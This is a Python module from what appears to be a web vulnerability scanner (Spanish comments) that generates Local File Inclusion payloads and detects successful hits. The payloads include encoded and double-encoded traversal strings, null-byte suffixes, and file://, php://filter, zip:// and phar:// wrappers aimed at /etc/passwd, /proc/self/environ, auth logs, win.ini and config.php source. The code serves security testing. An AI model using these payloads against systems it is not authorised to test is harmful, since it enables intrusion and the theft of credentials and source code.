# webscanner/checkers/lfi.py
import re
from urllib.parse import quote


class LFI:
    """
    Local File Inclusion:
      - Traversal con / y \\ (y sus encodings).
      - Objetivos Unix y Windows sin mezclar estilos.
      - Wrappers file://, php://filter, zip://, phar://.
      - Heurística por contenido característico.
    """

    def __init__(self, max_depth: int = 8, use_null_byte: bool = False):
        self.name = "Local File Inclusion (LFI)"
        self.max_depth = max_depth
        self.use_null_byte = use_null_byte

        self._unix_targets_rel = [
            "etc/passwd",
            "etc/hosts",
            "proc/self/environ",
            "proc/self/cmdline",
            "var/log/auth.log",
        ]
        self._win_targets_rel = [
            "Windows/win.ini",
            "boot.ini",
            "Windows/System32/drivers/etc/hosts",
        ]

        self.payloads = self._build_payloads()

        # Patrones
        self._hit = [
            # Unix
            re.compile(r"^root:x:0:0:", re.M),
            re.compile(r"\b127\.0\.0\.1\b.*localhost", re.I),
            re.compile(r"(APACHE|NGINX|HTTP)_", re.I),  # env del proceso
            re.compile(r"\b/bin/(bash|sh|zsh|csh|ksh)\b"),
            re.compile(r"uid=\d+"),  # salida de id
            re.compile(r"Linux version", re.M),
            re.compile(r"Ubuntu|pam_unix", re.M),
            # Windows
            re.compile(r"^\[fonts\]", re.I | re.M),
            re.compile(r"for 16-bit app support", re.I),
            # PHP filter -> base64 (heurística de blob largo)
            re.compile(r"^[A-Za-z0-9+/=\s]{200,}$"),
        ]

        # Errores
        self._err = [
            re.compile(r"failed to open stream", re.I),
            re.compile(r"No such file or directory", re.I),
            re.compile(r"open_basedir restriction", re.I),
            re.compile(r"Warning:\s*(?:include|require|fopen)", re.I),
            re.compile(r"File name too long", re.I),
            re.compile(r"System\.IO\.", re.I),
        ]

    def get_payloads(self):
        return self.payloads

    def check_response(self, response) -> bool:
        body = response.text or ""
        for rx in self._hit:
            if rx.search(body):
                return True
        return False

    # --------- helpers internos ---------

    def _build_payloads(self):
        out = []

        # Traversal tokens (crudos y URL-enc)
        ups = [
            "../",                  # unix
            "..%2f",                # ../
            "%2e%2e/",              # ../
            "..%252f",              # double-enc ../
            # backslash
            "..\\",                 # win
            "..%5c",
            "%2e%2e\\",
            "..%255c",
            # evasiones simples
            "..././",               # bypass ingenuo
            "..../",                # algunos normalizadores
        ]

        # Profundidades
        depths = []
        for d in range(1, self.max_depth + 1):
            for u in ups:
                depths.append(u * d)

        # Unix: generar con / y con %2f enc.
        for rel in self._unix_targets_rel:
            for prefix in depths:
                p = prefix + rel
                out.append(p)                  # tal cual
                out.append(self._enc_once(p))  # encode simple
                out.append(self._enc_twice(p))  # double-encode
                if self.use_null_byte:
                    out.append(p + "%00")

        # Windows: generar con backslash y forward slash
        for rel in self._win_targets_rel:
            rel_fwd = rel.replace("\\", "/")
            rel_back = rel.replace("/", "\\")
            for prefix in depths:
                # prefijo en / → objetivo en /
                p1 = prefix + rel_fwd
                out.append(p1)
                out.append(self._enc_once(p1))
                out.append(self._enc_twice(p1))
                if self.use_null_byte:
                    out.append(p1 + "%00")

                # prefijo en \ → objetivo en \
                pref_back = prefix.replace("/", "\\")
                p2 = pref_back + rel_back
                out.append(p2)
                out.append(self._enc_once(p2))
                out.append(self._enc_twice(p2))
                if self.use_null_byte:
                    out.append(p2 + "%00")

        # Wrappers file:// (absolutas)
        out += [
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file://C:/Windows/win.ini",
            "file://C:\\Windows\\win.ini",
            "file://C:/boot.ini",
            "file://C:\\boot.ini",
        ]

        # Wrappers PHP: php://filter (lee código fuente en base64)
        out += [
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=app.php",
            "php://filter/convert.base64-encode/resource=config.php",
        ]

        # Otros wrappers interesantes cuando allow_url_fopen/phar están activos
        out += [
            # zip:// y phar:// requieren rutas válidas en el FS; aún así útil para probar paths
            "zip://./app.zip#config.php",
            "phar://./cache/phar.phar/config.php",
        ]

        # Dedup preservando orden
        seen = set()
        uniq = []
        for p in out:
            if p not in seen:
                seen.add(p)
                uniq.append(p)
        return uniq

    @staticmethod
    def _enc_once(s: str) -> str:
        return quote(s, safe="")

    @staticmethod
    def _enc_twice(s: str) -> str:
        return quote(quote(s, safe=""), safe="")
